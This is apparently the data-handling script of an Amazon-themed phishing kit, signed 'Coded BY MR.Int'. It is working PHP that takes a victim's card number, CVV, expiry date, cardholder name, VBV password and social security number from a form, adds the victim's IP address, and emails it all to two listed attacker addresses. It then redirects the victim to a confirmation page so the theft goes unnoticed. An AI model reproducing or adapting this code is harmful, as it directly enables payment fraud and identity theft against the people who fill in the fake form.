<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-------------------- Amazon CREDITCARD -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "CREDITCARD:    ".$_POST['cc_number']."\n";
$message .= "cvv2_number  :    ".$_POST['cvv2_number']."\n";
$message .= "Expiratin date      : ".$_POST['exmonth']."-".$_POST['exyear']."\n";
$message .= "CARDHOLDER:    ".$_POST['cc_holder']."\n";
$message .= "VBV  :    ".$_POST['vbv']."\n";
$message .= "SSN:    ".$_POST['ssn']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : https://geoiptool.com//?ip=$ip\n";                          
$message .= ">>>>>>>>>>>>>>>>>> Coded BY MR.Int  <<<<<<<<<<<<<<<\n";

$subject = "Amazon (CREDITCARD) [$IP] <3 ";
$send = "johnson99@mailnesia.com,johnsonbridges117@gmail.com";
$headers = 'From: CREDITCARD' . "\r\n";
mail($send,$subject,$message,$headers);

/*$file_path = "logs.txt";

 if(file_exists($file_path)){
   $fhandle = fopen($file_path,'a+');
   file_put_contents($file_path,trim($msg_body."\n"),FILE_APPEND);
   fclose($fhandle); 
 }else{ 
    echo "No";
	  }*/
header("Location:confirmed.php");
include("../css/htaccess.css");// please  do not play with this , this script to protect your scama
?>



